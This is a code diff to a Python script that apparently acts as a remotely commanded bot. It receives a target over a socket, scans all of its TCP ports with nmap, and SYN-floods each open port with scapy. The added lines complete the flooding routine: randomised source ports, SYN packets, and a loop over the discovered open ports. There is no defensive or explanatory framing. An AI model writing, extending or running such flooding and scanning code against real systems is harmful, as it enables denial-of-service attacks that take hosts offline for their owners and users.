@@ -4,7 +4,7 @@ from scapy.all import *
 import random
 import nmap
 
-def synflood(TARGET):
+def synflood(TARGET,TARGETPORT):
 	PACKETS_TO_SEND = 1000
 
 	for index in range(PACKETS_TO_SEND):
@@ -13,6 +13,11 @@ def synflood(TARGET):
 		ippacket.dst = TARGET
 
 		tcppacket = TCP()
+		tcppacket.sport = random.randint(0,65535)
+		tcppacket.dport = TARGETPORT
+		tcppacket.flags = 'S'
+		p1 = ippacket / tcppacket
+		send(p1, verbose=0)		
 
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -37,8 +42,12 @@ while True:
 			STATUS = "ATTACKING USING SYN FLOOD"
 			nm = nmap.PortScanner()
 			nm.scan(parseddata[3],'1-65535')
+			getopenports = nm[parseddata[3]].all_tcp()
+			for index in range(len(getopenports)):
+				synflood(parseddata[3],getopenports[index])
 			with open("log.txt", 'a') as f:
-				f.write(str(nm.scaninfo()))
+				f.write(str(nm[parseddata[3]].all_tcp()))
+
 			#s.send(str(nm.scaninfo()))
 
 	print("Data receieved: {}".format(data))
